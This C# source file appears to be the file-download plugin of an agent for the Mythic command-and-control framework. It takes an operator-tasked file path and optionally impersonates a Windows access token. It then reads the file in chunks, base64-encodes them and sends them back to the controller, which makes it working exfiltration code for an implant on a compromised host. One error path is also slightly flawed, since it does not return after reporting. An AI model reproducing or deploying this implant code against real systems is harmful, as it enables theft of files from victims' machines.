using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IFilePlugin
    {
        public string Name => "download";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ITokenManager tokenManager { get; set; }
        private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.downloadJobs = new ConcurrentDictionary<string, ServerDownloadJob>();
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            if(job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }


            DownloadArgs args = JsonSerializer.Deserialize<DownloadArgs>(job.task.parameters);
            if (args is null || string.IsNullOrEmpty(args.file))
            {
                await messageManager.AddResponse(new DownloadResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", "0x16" } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            ServerDownloadJob downloadJob = new ServerDownloadJob(job, args);

            //Calculate the total number of chunks required
            downloadJob.total_chunks = await GetTotalChunks(downloadJob);

            //Add the job to the list of jobs
            downloadJobs.GetOrAdd(job.task.id, downloadJob);
            
            logger.Log($"Starting download job ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
            
            //If there are no chunks, then we can't do anything
            if (downloadJob.total_chunks == 0)
            {
                downloadJobs.Remove(job.task.id, out _);

                await messageManager.AddResponse(new DownloadResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", "0x16" } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
            }

            //Send the first response, start download process.
            await messageManager.AddResponse(new DownloadResponse
            {
                download = new DownloadResponseData()
                {
                    total_chunks = downloadJob.total_chunks,
                    full_path = downloadJob.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = "",
                },
                user_output = string.Empty,
                task_id = job.task.id,
                completed = false,
                status = string.Empty,
                file_id = null
            }.ToJson());

            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }

        public async Task HandleNextMessage(ServerResponseResult response)
        {
            //Get Tracker job
            ServerDownloadJob downloadJob = this.GetJob(response.task_id);
            //The job was cancelled by the user. We need to clean up and exit
            if (downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                this.CompleteDownloadJob(response.task_id);
            }

            //Prepare download response
            DownloadResponse dr = new DownloadResponse()
            {
                task_id = response.task_id,
                download = new DownloadResponseData
                {
                    is_screenshot = false,
                    host = ""
                }
            };

            if (String.IsNullOrEmpty(downloadJob.file_id))
            {
                //We were never given as file id's so we're unable to track properly. Let the user know.
                if (string.IsNullOrEmpty(response.file_id))
                {
                    dr.status = "error";
                    dr.process_response = new Dictionary<string, string> { { "message", "0x13" } };
                    dr.completed = true;

                    await messageManager.AddResponse(dr.ToJson());
                    this.CompleteDownloadJob(response.task_id);
                    return;
                }

                //Update the file_id to the one provided by mythic
                downloadJob.file_id = response.file_id;
            }

            //If the response is not successful, try again.
            if (response.status != "success")
            {
                dr.file_id = downloadJob.file_id;
                dr.download.chunk_num = downloadJob.chunk_num;
                logger.Log($"Handling next chunk for file {downloadJob.file_id} ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
                if (downloadJob.task.token != 0)
                {
                    tokenManager.Impersonate(downloadJob.task.token);
                }
                dr.download.chunk_data = await this.HandleNextChunk(downloadJob);

                await messageManager.AddResponse(dr.ToJson());
                if (downloadJob.task.token != 0)
                {
                    tokenManager.Revert();
                }
                return;
            }

            //If the response is successful, move onto the next chunk.
            downloadJob.chunk_num++;
            dr.completed = (downloadJob.chunk_num == downloadJob.total_chunks);
            dr.file_id = downloadJob.file_id;
            dr.user_output = String.Empty;
            dr.download.full_path = downloadJob.path;
            dr.download.total_chunks = -1;
            dr.download.file_id = downloadJob.file_id;
            dr.download.chunk_num = downloadJob.chunk_num;
            if (downloadJob.task.token != 0)
            {
                tokenManager.Impersonate(downloadJob.task.token);
            }
            dr.download.chunk_data = await this.HandleNextChunk(downloadJob);
            if (downloadJob.task.token != 0)
            {
                tokenManager.Revert();
            }
            logger.Log($"Handling next chunk for file {downloadJob.file_id} ({downloadJob.chunk_num}/{downloadJob.total_chunks})");

            await messageManager.AddResponse(dr.ToJson());

            if (dr.completed)
            {
                this.CompleteDownloadJob(response.task_id);
            }
        }
        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<int> GetTotalChunks(ServerDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                int total_chunks = (int)(fi.Length + job.chunk_size - 1) / job.chunk_size;
                return total_chunks;
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public void CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);
            this.messageManager.CompleteJob(task_id);
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public async Task<string> HandleNextChunk(ServerDownloadJob job)
        {
            try
            {
                if (job.total_chunks == 1)
                {
                    job.complete = true;
                    return Misc.Base64Encode(await File.ReadAllBytesAsync(job.path));
                }
                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);

                using var fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
                byte[] buffer = new byte[job.chunk_size];

                FileInfo fileInfo = new FileInfo(job.path);

                if (fileInfo.Length - totalBytesRead < job.chunk_size)
                {
                    job.complete = true;
                    buffer = new byte[fileInfo.Length - job.bytesRead];
                }

                fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);
                
                fileStream.Close();
                fileStream.Dispose();

                return Misc.Base64Encode(buffer);
            }
            catch (Exception e)
            {
                job.complete = true;
                return e.Message;
            }
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public ServerDownloadJob GetJob(string task_id)
        {
            return downloadJobs[task_id];
        }
    }
}
